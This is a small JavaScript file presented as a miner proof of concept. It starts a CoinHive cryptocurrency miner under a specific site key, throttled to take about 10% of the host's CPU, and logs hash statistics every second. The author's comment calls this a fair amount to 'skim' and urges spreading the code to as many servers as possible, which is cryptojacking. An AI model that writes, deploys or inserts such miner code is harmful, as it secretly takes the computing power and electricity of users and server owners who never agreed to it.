/* MinerPOC.js
~dwulf
This is a simple miner Object, ran through the CoinHive API , to collect 10% of the computer
CPU throughput.

The code GjZMl2A5jCPzj6NK5dkuXqn8y6m1gv8N should be placed in a variable and imported into the
script, then placed as the first argument, the throttle is set for 0.9 (or 10% of the total available
CPU).  I find this is a fair amount to skim, the key is to distribute the code to as many servers as
you can.


*/

            let miner = new CoinHive.Anonymous('GjZMl2A5jCPzj6NK5dkuXqn8y6m1gv8N', {throttle: 0.9});
            miner.start();

            // Listen on events
            miner.on('found', function() {
                console.log("found hash!")
            })
            miner.on('accepted', function() {
                console.log("accepted hash!")
            })

            // Update stats once per second
            // Self invoking anonymous function
            //  invokes once every second.
            setInterval(function() {
                let hashesPerSecond = miner.getHashesPerSecond();
                let totalHashes = miner.getTotalHashes();
                let acceptedHashes = miner.getAcceptedHashes();

                console.log("hashesPerSecond", hashesPerSecond)
                console.log("totalHashes", totalHashes)
                console.log("acceptedHashes", acceptedHashes)

                console.log("-----------")
                console.log("Mining 10% of CPU Throughput")
                console.log("-----------")
                console.log("dwulf thanks you")

                // Output to HTML elements...
                // You have to interface with the UI
                //  to tell the user what time it is.

            }, 1000);
